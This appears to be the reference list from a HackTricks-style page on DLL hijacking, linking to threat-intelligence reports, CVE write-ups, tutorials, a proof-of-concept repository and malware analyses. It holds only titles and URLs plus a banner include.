- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
